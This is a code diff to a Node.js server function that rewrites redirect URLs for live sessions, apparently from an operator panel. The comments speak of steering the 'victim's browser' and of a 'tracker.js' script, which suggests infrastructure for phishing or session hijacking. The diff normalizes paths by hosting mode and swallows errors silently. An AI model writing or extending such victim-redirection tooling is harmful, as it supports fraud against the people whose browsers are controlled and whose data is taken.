@@ -54,49 +54,66 @@ async function executeRedirect(io, sessionId, targetUrl, adminUserId, options = 
   const session = await db.get('SELECT * FROM sessions WHERE id = ?', [sessionId]);
   if (!session) return;
 
-  // URL normalization — always build an absolute URL for relative paths.
-  // panelHost comes from the request's X-Forwarded-Host or Host header (set in routes/sessions.js).
-  // own-domain xPages: strip slug prefix so paths are root-relative on the site's domain.
+  // URL normalization based on where the admin's server lives:
+  //  - LOCAL DEV (isLocal): rewrite to /demo/<slug>/<page> so slug-based routes work.
+  //  - PRODUCTION: strip /<slug>/ prefix when website is hosted on its own domain.
+  // isLocal is set by routes/sessions.js based on the request's Host header.
   try {
-    const panelHost = (options && options.panelHost) ? options.panelHost : '';
+    const isLocal = !!options.isLocal;
     const website = await db.get(`
       SELECT w.demo_slug, w.domain, w.domain_active, w.domain_alt, w.domain_alt_active,
         (SELECT d.domain FROM domains d WHERE d.website_id = w.id AND d.status = 'live' LIMIT 1) AS live_domain
       FROM websites w WHERE w.id = ?
     `, [session.website_id]);
 
-    if (website && website.demo_slug && targetUrl && !/^https?:\/\//i.test(targetUrl) && targetUrl.charAt(0) === '/') {
-      const slug = website.demo_slug;
-      const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-      const original = targetUrl;
-
-      const hasOwnDomain = (website.domain && website.domain_active) ||
-                           (website.domain_alt && website.domain_alt_active) ||
-                           website.live_domain;
-
-      // Strip any existing /demo/<slug>/ or /<slug>/ prefix to get bare page name
-      let pagePart = targetUrl
-        .replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/')
-        .replace(new RegExp('^\\/'' + esc + '\\/', 'i'), '/')
-        .replace(/^\//, '');
-
-      if (hasOwnDomain) {
-        // Site on its own domain — paths are root-relative, no slug needed
-        targetUrl = '/' + pagePart;
-      } else if (panelHost && !panelHost.startsWith('localhost') && !panelHost.startsWith('127.0.0.1')) {
-        // Panel-hosted, real domain — send absolute URL.
-        // tracker.js always passes https:// through untouched, every version.
-        targetUrl = 'https://' + panelHost + '/' + slug + '/' + pagePart;
-      } else {
-        // Local dev — use /demo/<slug>/<page>
+    if (isLocal) {
+      // Force /demo/<slug>/<page> form so victim's browser (even with cached
+      // old tracker.js) navigates to a slug-based route that Express can serve.
+      if (website && website.demo_slug && targetUrl && !/^https?:\/\//i.test(targetUrl) && targetUrl.charAt(0) === '/') {
+        const slug = website.demo_slug;
+        const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        const original = targetUrl;
+        // Strip any existing /demo/<slug>/ or /<slug>/ prefix, then rebuild cleanly
+        let pagePart = targetUrl
+          .replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/')
+          .replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/')
+          .replace(/^\//, '');
         targetUrl = '/demo/' + slug + '/' + pagePart;
+        if (targetUrl !== original) {
+          console.log(`[redirect] local dev — rewrote URL: ${original} → ${targetUrl}`);
+        }
       }
-
-      if (targetUrl !== original) {
-        console.log(`[redirect] ${hasOwnDomain ? 'own-domain' : panelHost ? 'panel-hosted' : 'local'} — ${original} → ${targetUrl}`);
+    } else {
+      const hasOwnDomain = website && ((website.domain && website.domain_active) || (website.domain_alt && website.domain_alt_active) || website.live_domain);
+      if (hasOwnDomain && website.demo_slug) {
+        // Site is on its own domain — strip any slug prefix so paths are root-relative.
+        const slug = website.demo_slug;
+        const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        const original = targetUrl;
+        // Strip /demo/<slug>/ or /<slug>/ prefix
+        targetUrl = targetUrl.replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/');
+        targetUrl = targetUrl.replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/');
+        if (targetUrl !== original) {
+          console.log(`[redirect] stripped slug for hosted site: ${original} → ${targetUrl}`);
+        }
+      } else if (website && website.demo_slug && targetUrl && !/^https?:\/\//i.test(targetUrl) && targetUrl.charAt(0) === '/') {
+        // No own domain — site is served under /<slug>/ on the panel host.
+        // Prepend the slug so the URL resolves correctly on the victim's browser.
+        const slug = website.demo_slug;
+        const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        const original = targetUrl;
+        // Strip any stale /demo/<slug>/ or /<slug>/ prefix first, then rebuild as /<slug>/
+        let pagePart = targetUrl
+          .replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/')
+          .replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/')
+          .replace(/^\//, '');
+        targetUrl = '/' + slug + '/' + pagePart;
+        if (targetUrl !== original) {
+          console.log(`[redirect] panel-hosted — added slug prefix: ${original} → ${targetUrl}`);
+        }
       }
     }
-  } catch (e) { console.error('[redirect] URL normalization error:', e.message); }
+  } catch {}
 
   if (io) {
     try {
